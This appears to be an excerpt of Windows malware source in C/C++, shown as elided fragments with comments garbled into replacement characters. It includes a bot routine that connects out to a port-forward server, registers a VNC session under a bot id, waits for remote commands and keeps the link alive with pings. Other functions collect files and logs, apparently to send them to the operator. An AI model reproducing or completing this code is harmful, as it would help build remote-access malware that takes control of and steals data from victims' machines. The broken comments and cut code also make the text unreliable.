...
static DWORD WINAPI MainPortForward(void* param)
{
    ...
    while(true)
    {
        ...
        SOCKET sc = ConnectWithIP( IP_PORTFORW, PORT_PORTFOW ); //����������� � ��������
        if( sc )
        {
            curr_sc = sc;
            DbgMsg("Connect vnc");
            if( WritePacket( ID_VNC_CONNECT, sc, idBot, c_idBot ) ) //�������� ������� �� ����
            {
                DbgMsg(idBot);
                int on_ping = 3; //�������� ������� ��� ��� ������� ������ 6 �
                while(true)
                {
                    ...
                    int id;
                    //DbgMsg("wait packet");
                    int sz = ReadPacket( id, sc, &data, 2 ); //���� ������� �� �������
                    if( sz == 0 )
                        break;
                    if( sz > 0 )
                    {
                    ...
                    if( on_ping-- == 0 )
                    {
                        if( !WritePacket( ID_PING, sc, &sz, 1 ) ) //������� ��� ����������, ����� ������� ��� ����
                            break;
                        on_ping = 3; //����� 6 ������ ����� ����� �����
                    }
                }
...
FileInfo* FindAddFileInfo( int type, const char* nameFile )
{
	...
	if( finded == 0 )
	{
		...
		if( file != 0 )
		{
			...
			char* nf = PathFindFileNameA(nameFile); //������ ��� �����
			//������ ������ ����� ����� �� �������
			char buf[128];
			buf[0] = type;
			lstrcpyA( buf + 1, nf );
	...
	if( fi )
	{
		...
		if( f )
		{
			...
			if( size > fi->size )
			{
				...
				if ( c_data > 4096 - 256 ) c_data = 4096 - 256; //��-�� ����������� �� ������� ������
...
void SendLogs()
{
	...
	WIN32_FIND_DATAA fd;
	DbgMsg(path);
	HANDLE finder = FindFirstFileA( path, &fd ); //��������� �����
